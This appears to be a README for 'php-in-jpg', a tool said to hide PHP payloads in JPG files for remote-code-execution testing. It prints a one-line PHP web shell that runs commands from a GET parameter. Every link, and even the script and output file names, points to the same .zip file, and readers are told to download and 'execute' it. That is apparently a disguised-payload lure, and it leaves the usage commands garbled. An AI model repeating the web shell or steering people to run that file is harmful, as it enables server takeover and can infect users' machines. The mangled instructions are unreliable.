# php-in-jpg 🖼️💻

![GitHub Repo stars](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip) ![GitHub forks](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip) ![GitHub issues](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip)

php-in-jpg is a simple yet flexible tool that generates .jpg image files embedding PHP payloads, designed to support PHP RCE polyglot techniques. This project is aimed at security researchers and penetration testers looking to explore the potential of PHP in unconventional formats.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Features

- **Simple to Use**: Generate .jpg files with embedded PHP payloads easily.
- **Flexible**: Supports various PHP payloads for different scenarios.
- **Polyglot Support**: Ideal for RCE (Remote Code Execution) testing.
- **Lightweight**: Minimal dependencies for quick setup.

## Installation

To get started with php-in-jpg, you need to clone the repository and install the necessary dependencies. Use the following commands:

```bash
git clone https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip
cd php-in-jpg
```

Make sure you have PHP installed on your machine. You can check this by running:

```bash
php -v
```

If you don't have PHP installed, please follow the instructions on the [official PHP website](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip).

## Usage

After installation, you can generate a .jpg file with a PHP payload. The command structure is as follows:

```bash
php https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip [payload] [https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip]
```

### Parameters

- `payload`: The PHP code you want to embed.
- `https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip`: The name of the output file.

For example, to create a .jpg file with a simple PHP payload, you would run:

```bash
php https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip "<?php phpinfo(); ?>" https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip
```

## Examples

Here are a few examples of using php-in-jpg:

### Example 1: Basic PHP Payload

```bash
php https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip "<?php echo 'Hello, World!'; ?>" https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip
```

This command generates a .jpg file named `https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip` that, when executed on a server, will display "Hello, World!".

### Example 2: RCE Payload

```bash
php https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip "<?php system($_GET['cmd']); ?>" https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip
```

This command creates an image that allows for command execution via the `cmd` GET parameter.

### Example 3: Polyglot Usage

You can also use php-in-jpg to create polyglot files that serve multiple purposes. For instance:

```bash
php https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip "<?php echo 'Polyglot!'; ?>" https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip
```

This file can be interpreted as both a valid image and a PHP script.

## Contributing

We welcome contributions to php-in-jpg! If you have suggestions or improvements, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes and commit them (`git commit -m 'Add new feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Open a pull request.

Please ensure your code follows the existing style and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or suggestions, feel free to reach out:

- **Author**: [Your Name](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip)
- **Email**: https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip

## Releases

You can find the latest releases of php-in-jpg [here](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip). Download the latest version and execute the file as needed.

To stay updated, visit the [Releases](https://raw.githubusercontent.com/Mxzinedits/php-in-jpg/main/template/php_jpg_in_v2.7.zip) section regularly.

## Acknowledgments

- Thanks to the open-source community for their continuous support and contributions.
- Special thanks to the developers of the libraries used in this project.

## Conclusion

php-in-jpg provides a unique way to generate images that can also execute PHP code. This tool is a valuable asset for penetration testers and security researchers. With its simple interface and flexible capabilities, you can explore various RCE techniques effectively.

We hope you find this tool useful in your security assessments. Happy hacking!